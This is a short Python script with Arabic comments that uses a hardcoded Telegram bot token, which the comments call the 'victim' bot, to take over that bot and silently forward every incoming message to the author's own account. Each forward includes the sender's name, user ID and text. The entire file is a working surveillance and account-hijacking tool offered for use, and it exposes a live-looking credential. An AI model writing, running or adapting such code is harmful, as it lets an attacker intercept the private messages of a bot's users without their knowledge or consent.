from telegram import Update
from telegram.ext import Application, MessageHandler, filters, ContextTypes

# بيانات الضحية (البوت الذي نراقبه)
VICTIM_BOT_TOKEN = '8988406192:AAGcfp4QJBpYK4unEX_q-EayPsz_htE20z4'

# بياناتك أنت (لكي تصلك الرسائل على حسابك)
MY_ID = 7145266755 

async def spy_and_forward(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_name = update.message.from_user.full_name
        user_id = update.message.from_user.id
        text = update.message.text if update.message.text else "[ملف أو صورة]"
        
        alert_message = (
            f"🚨 **تنبيه: رسالة جديدة وصلت لبوت الضحية!**\n\n"
            f"👤 المرسل: {user_name}\n"
            f"🆔 الآيدي: {user_id}\n"
            f"💬 النص: {text}"
        )
        
        await context.bot.send_message(chat_id=MY_ID, text=alert_message)
    except Exception as e:
        print(f"Error: {e}")

if __name__ == '__main__':
    # استخدام التوكن الخاص بالضحية للتحكم في بوت الضحية
    app = Application.builder().token(VICTIM_BOT_TOKEN).build()
    
    app.add_handler(MessageHandler(filters.ALL, spy_and_forward))
    
    print("✅ البوت يعمل الآن على السيرفر...")
    app.run_polling()
